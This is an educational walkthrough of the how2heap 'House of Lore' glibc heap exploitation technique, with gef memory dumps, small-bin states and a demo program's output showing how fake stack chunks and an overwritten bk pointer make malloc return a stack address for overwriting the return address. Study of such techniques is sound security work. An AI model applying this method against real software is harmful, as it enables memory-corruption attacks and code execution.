# Shellphish how2heap House of Lore

This is another section from Shellphish's educational heap exploitation series. This one focuses on the House of Lore exploit.

This exploit essentially requires you to be able to write some integers to the stack to create two fake chunks, allocate and free certain sections of memory in the heap, and overflow a `bk` pointer to a freed section of memory. After that, you can use House of Lore to return a pointer to the stack, which you can use to write to the return address without overwriting the stack canary (since you can just directly write to it).

## Process

First we allocate the victim chunk:
```
0:	0x64 Victim Chunk
```

We also allocate two char arrays on the stack to store the fake chunk:
```
stack-0:	0x7fffffffdee0
stack-1:	0x7fffffffdec0
```

We will have to edit the data on the stack to make the fake chunk. Before that this is what the  data looks like prior us editing it:
```
gef➤  x/12g 0x7fffffffdec0
0x7fffffffdec0:	0x0000000000000000	0x0000000000000000
0x7fffffffded0:	0x0000000000000000	0x0000555555554dcd
0x7fffffffdee0:	0x0000000000000000	0x0000000000000000
0x7fffffffdef0:	0x0000000000000000	0x0000000000000000
0x7fffffffdf00:	0x00007fffffffdff0	0xbe9a1d2ebaa73300
0x7fffffffdf10:	0x0000555555554d80	0x00007ffff7a303f1
```

Now we have to edit the data to make the fake chunks. For `stack-0` (stored at `0x7fffffffdee0`), we will have to edit the first `0x10` bytes to be `0x0` to zero out these spaces (which hold the valuse for `prev_size` and `size`) in order to pass the `malloc` checks. In addition to that, we will be setting the `fwd` pointer to the address of chunk `0` in the heap (the `fwd` pointer stores the address  for the next chunk that was allocated, if it is free) which will be the third qword stored at `0x7fffffffdef0`. In addition to that we will need to overwrite the `bk` pointer (stores the previously allocated chunk, if it is free) with the address of `stack-1`. For `stack-1` we will need to clear out `prev_size` and `size` stores at `0x7fffffffdec0` and `0x7fffffffdec8`, however in addition to that, we will need to set it's `fwd` pointer to `stack-0`:

```
gef➤  x/12g 0x7fffffffdec0
0x7fffffffdec0:	0x0000000000000000	0x0000000000000000
0x7fffffffded0:	0x00007fffffffdee0	0x0000555555554dcd
0x7fffffffdee0:	0x0000000000000000	0x0000000000000000
0x7fffffffdef0:	0x0000555555757000	0x00007fffffffdec0
0x7fffffffdf00:	0x00007fffffffdff0	0xbe9a1d2ebaa73300
0x7fffffffdf10:	0x0000555555554d80	0x00007ffff7a303f1
```

Next we will allocate another large heap chunk in order to avoid a heap consolidation with the top chunk, when we free the small one:

```
0:	0x64 Victim Chunk
1:	0x3e8 
```

Next we will free chunk `0`, and it will end up in the unsorted bin:
```
0:	0x64 Victim Chunk (freed)
1:	0x3e8 
```

Right now the recently freed chunk `0` shouldn't have a `bk` or `fwd` pointer since being an unsorted bin doesn't get you assign those, which we can see here:
```
gef➤  x/4g 0x555555757010
0x555555757010:	0x0000000000000000	0x0000000000000000
0x555555757020:	0x0000000000000000	0x0000000000000000
```

Proceeding that we will allocate another large chunk, that cannot be handled in the Unsorted bin list. This means that the old chunk `0` will be inserted into the front of the Small Bin list (and thus have a `bk` and `fwd` pointer assigned):

```
0:	0x64	(freed)	Victim Chunk
1:	0x3e8
2:	0x4b0
```

We can see that our heap chunk has made it as a small bin (the address starts `0x10` bytes before the ptr you saw earlier, because of the `0x10` bytes of heap metadata):
```
gef➤  heap bins small
───────────────────────────────────────────────────────────────────────────────────[ Small Bins for arena 'main_arena' ]───────────────────────────────────────────────────────────────────────────────────
[+] small_bins[6]: fw=0x555555757000, bk=0x555555757000
 →   Chunk(addr=0x555555757010, size=0x70, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
```

Which now that we have allocated that chunk, we can see those pointer clearly after the `malloc`:
```
gef➤  x/4g 0x555555757010
0x555555757010:	0x00007ffff7dd1bb8	0x00007ffff7dd1bb8
0x555555757020:	0x0000000000000000	0x0000000000000000
```

Now here is where the vulnerabillity comes in. Essentially we will just overwrite chunk `0`'s `bk` pointer. This can be done with something such as a heap overflow. We will overflow it with the address of `stack-0` `0x7fffffffdec0`:
```
gef➤  x/4g 0x555555757010
0x555555757010:	0x00007ffff7dd1bb8	0x00007fffffffdee0
0x555555757020:	0x0000000000000000	0x0000000000000000
```

Now we will allocate another chunk with a size that is equal to that of the old chunk `0`. This should return the overwritten victim chunk `0`, and also set `bin->bk` pointer to the value we overwrote which was chunk `0`'s bk pointer:

```
0:	0x64	(freed)	Victim Chunk
1:	0x3e8
2:	0x4b0
3:	0x64
```

After that malloc, we can see that `bin->bk` is indeed the value that we would expect it to be, `stack-0`'s address `0x7fffffffdec0`:
```
gef➤  heap bins small
───────────────────────────────────────────────────────────────────────────────────[ Small Bins for arena 'main_arena' ]───────────────────────────────────────────────────────────────────────────────────
[+] small_bins[6]: fw=0x555555757000, bk=0x7fffffffdec0
 →   Chunk(addr=0x555555757010, size=0x70, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
``` 

Now the pointer `bin->bk` is the value that will be allocated if a chunk of memory is requested of size `0x64`. Since `bin->bk` is now a value that we overwritten `chunk_0->bk` with, we control the next chunk that is allocated (that is of size `0x64`). Here we can see in memory that `bin->bk` is indeed the address of the first char array we allocated:
Lastly we can just allocate a chunk of size `0x64`, and we will get `malloc` to return a pointer to the stack:

```
p4 is 0x7fffffffdef0 and should be on the stack!
``` 

We can see that we have succesfully gotten `malloc` to return a pointer to the stack. Also we can see that the `fwd` pointer for `stack-1` was changed to `0x7ffff7dd1bb8`, which we would expect to see since `bin->bk` was set to the address of `stack-1`. Proceeding that, they just use the allocated stack chunk to write over the `rip` register to get code execution

## Code Running

Here is the code for the section running:

```
Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x555555757010
stack_buffer_1 at 0x7fffffffdee0
stack_buffer_2 at 0x7fffffffdec0
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stack
Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x555555757080
Freeing the chunk 0x555555757010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: (nil)
victim->bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x555555757010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x555555757470

The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7ffff7dd1bb8
victim->bk: 0x7ffff7dd1bb8


Now emulating a vulnerability that can overwrite the victim->bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointe
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7ffff7dd1bb8

p4 is 0x7fffffffdef0 and should be on the stack!
Nice jump d00d
```
